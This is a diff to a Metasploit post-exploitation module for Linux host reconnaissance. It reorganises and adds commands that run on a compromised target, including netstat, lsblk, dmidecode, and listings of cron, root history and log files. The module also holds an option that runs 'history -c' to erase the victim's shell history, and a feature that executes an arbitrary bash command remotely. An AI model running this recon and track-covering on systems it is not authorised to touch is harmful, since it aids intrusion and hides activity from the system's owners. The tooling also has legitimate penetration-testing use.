@@ -100,8 +100,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
-                        'DisclosureDate' => 'set 27 2017',
+                        'Version'        => '$Revision: 1.4',
+                        'DisclosureDate' => 'set 30 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',  # root privileges required?
@@ -153,10 +153,10 @@ def run
   #
   # draw module banner ..
   #
-  print_line("+---------------------------------+")
-  print_line("|   LINUX HOSTRECON POST-MODULE   |")
-  print_line("|      Author : r00t-3xp10it      |")
-  print_line("+---------------------------------+")
+  print_line("+-------------------------------------+")
+  print_line("|     LINUX HOSTRECON POST-MODULE     |")
+  print_line("| Author : r00t-3xp10it (ssa-redteam) |")
+  print_line("+-------------------------------------+")
 
 
 
@@ -201,19 +201,15 @@ def run
       #
       data_dump=''
       print_status("Executing list of commands remotely ..")
-      Rex::sleep(0.5)
+      Rex::sleep(0.4)
       #
       # bash commands to be executed remotely ..
       #
       date_out = cmd_exec("date")
-      file_sys = cmd_exec("df -H")
-      mont_uuid = cmd_exec("lsblk -f")
       py_version = cmd_exec("python -V")
-      storage_mont = cmd_exec("lsblk -m")
       distro_uname = cmd_exec("uname -a")
-      net_stat = cmd_exec("netstat -tulpn")
       ruby_version = cmd_exec("ruby -v  | awk {'print $1,$2'}")
-      net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
+      firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
@@ -251,6 +247,7 @@ def run
         data_dump << "Bash version        : #{sh_version}\n"
         data_dump << "Python version      : #{py_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
+        data_dump << "Firefox version     : #{firefox_version}\n"
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
@@ -260,24 +257,6 @@ def run
         data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
         data_dump << "Distro uname        : #{distro_uname}\n"
-        data_dump << "\n\n\n"
-        data_dump << "FILE SYSTEM :\n"
-        data_dump << "-------------\n"
-        data_dump << file_sys
-        data_dump << "\n\n"
-        data_dump << "STORAGE DEVICES INFO:\n"
-        data_dump << "---------------------\n"
-        data_dump << storage_mont
-        data_dump << "\n\n"
-        data_dump << mont_uuid
-        data_dump << "\n\n"
-        data_dump << "TARGET OPEN PORTS :\n"
-        data_dump << "-------------------\n"
-        data_dump << net_stat
-        data_dump << "\n\n"
-        data_dump << "ESTABLISHED CONNECTIONS :\n"
-        data_dump << "-------------------------\n"
-        data_dump << net_established
         data_dump << "\n\n"
 
 
@@ -288,18 +267,22 @@ def run
         #
         if datastore['AGRESSIVE_DUMP'] == true
           print_status("Running agressive fingerprint modules ..")
-          Rex::sleep(0.5)
+          Rex::sleep(0.3)
           #
           # bash commands to be executed remotely ..
           #
+          file_sys = cmd_exec("df -H")
+          mont_uuid = cmd_exec("lsblk -f")
+          storage_mont = cmd_exec("lsblk -m")
           current_shell = cmd_exec("echo $0")
-          list_drivers = cmd_exec("lspci -vv")
+          list_drivers = cmd_exec("lspci -v")
+          net_stat = cmd_exec("netstat -tulpn")
           demi_bios = cmd_exec("dmidecode -t bios")
           cron_tasks = cmd_exec("ls -la /etc/cron*")
-          root_services = cmd_exec("ps -aux | grep '^root'")
           distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
+          net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
           default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
             print_status("Storing scan results into msf database ..")
             Rex::sleep(0.7)
@@ -310,6 +293,16 @@ def run
             data_dump << "+--------------------------+\n"
             data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
             data_dump << "+--------------------------+\n"
+            data_dump << "\n\n"
+            data_dump << "FILE SYSTEM :\n"
+            data_dump << "-------------\n"
+            data_dump << file_sys
+            data_dump << "\n\n"
+            data_dump << "STORAGE DEVICES INFO:\n"
+            data_dump << "---------------------\n"
+            data_dump << storage_mont
+            data_dump << "\n\n"
+            data_dump << mont_uuid
             data_dump << "\n\n"
             data_dump << "CURRENT SHELL :\n"
             data_dump << "---------------\n"
@@ -331,9 +324,13 @@ def run
             data_dump << "------------------------\n"
             data_dump << distro_logs
             data_dump << "\n\n"
-            data_dump << "ROOT SERVICES RUNNING :\n"
-            data_dump << "-----------------------\n"
-            data_dump << root_services
+            data_dump << "TARGET OPEN PORTS :\n"
+            data_dump << "-------------------\n"
+            data_dump << net_stat
+            data_dump << "\n\n"
+            data_dump << "ESTABLISHED CONNECTIONS :\n"
+            data_dump << "-------------------------\n"
+            data_dump << net_established
             data_dump << "\n\n"
             data_dump << "CRONTAB TASKS :\n"
             data_dump << "---------------\n"
@@ -430,7 +427,7 @@ def run
             # to be able to write the logfile and display the outputs ..
             #
             data_dump << "+--------------------------------+\n"
-            data_dump << "|   COMMAND TO EXECUTE REMOTELY  |\n"
+            data_dump << "|    COMMAND EXECUTED REMOTELY   |\n"
             data_dump << "+--------------------------------+\n"
             data_dump << "Execute: #{exec_bash}"
             data_dump << "\n\n"
@@ -447,7 +444,7 @@ def run
        print_status("Deleting remote bash shell history commands list  ..")
        Rex::sleep(0.7)
      end
-        data_dump << "-----------------------------------------------"
+        data_dump << "----------------------------------------------"
 
 
 
@@ -477,7 +474,7 @@ def run
      # This funtion will delete all entrys from remote bash shell (history command list) ..
      #
      if datastore['DEL_SHELL_HISTORY'] == true
-       print_warning("Remote bash shell history commands list deleted ..")
+       print_warning("Remote bash shell history commands list deleted")
        cmd_exec("history -c")
        Rex::sleep(0.5)
      end
